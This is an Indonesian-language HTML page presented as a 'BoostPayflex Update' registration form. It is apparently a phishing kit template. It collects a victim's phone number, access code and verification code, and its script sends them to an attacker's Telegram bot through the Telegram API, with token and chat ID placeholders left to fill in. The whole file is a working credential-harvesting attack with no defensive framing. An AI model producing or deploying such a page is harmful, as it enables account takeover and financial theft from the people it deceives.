<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BoostPayflex Update</title>

<style>
*{box-sizing:border-box}
body{
  margin:0;
  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto;
  background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
  min-height:100vh;
  display:flex;
  align-items:center;
  justify-content:center;
}

.card{
  width:100%;
  max-width:380px;
  background:#fff;
  border-radius:14px;
  padding:24px 20px;
  box-shadow:0 15px 35px rgba(0,0,0,.25);
}

h2{
  margin:0 0 6px;
  text-align:center;
  font-size:22px;
  color:#111;
}

.sub{
  text-align:center;
  font-size:13px;
  color:#666;
  margin-bottom:18px;
}

label{
  font-size:12px;
  color:#444;
}

input{
  width:100%;
  padding:12px;
  margin:6px 0 14px;
  border:1px solid #ddd;
  border-radius:8px;
  font-size:15px;
}

input:focus{
  outline:none;
  border-color:#000;
}

button{
  width:100%;
  padding:13px;
  border:none;
  border-radius:8px;
  background:#000;
  color:#fff;
  font-size:16px;
  font-weight:600;
}

button:active{opacity:.9}

#status{
  margin-top:12px;
  text-align:center;
  font-size:14px;
}
</style>
</head>

<body>

<div class="card">
  <h2>BoostPayflex Update</h2>
  <div class="sub">Form Pendaftaran / Update Info</div>

  <form id="formBoost">
    <label>Nomor Phone</label>
    <input type="tel" placeholder="08xxxxxxxxxx" required>

    <label>Kode Akses</label>
    <input type="password" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" required>

    <label>Kode Verifikasi</label>
    <input type="password" placeholder="‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢‚Ä¢" required>

    <button type="submit">Kirim Data</button>
  </form>

  <div id="status"></div>
</div>

<script>
const BOT_TOKEN="ISI_TOKEN_KAMU";
const CHAT_ID="ISI_CHAT_ID_KAMU";

document.getElementById("formBoost").addEventListener("submit",function(e){
  e.preventDefault();
  const i=document.querySelectorAll("input");

  const pesan=
`üì• BoostPayflex Update

üì± Phone: ${i[0].value}
üîê Kode Akses: ${i[1].value}
üîë Kode Verifikasi: ${i[2].value}`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({chat_id:CHAT_ID,text:pesan})
  }).then(()=>{
    document.getElementById("status").innerHTML="‚úÖ Data berhasil dikirim";
    e.target.reset();
  }).catch(()=>{
    document.getElementById("status").innerHTML="‚ùå Gagal mengirim data";
  });
});
</script>

</body>
</html>
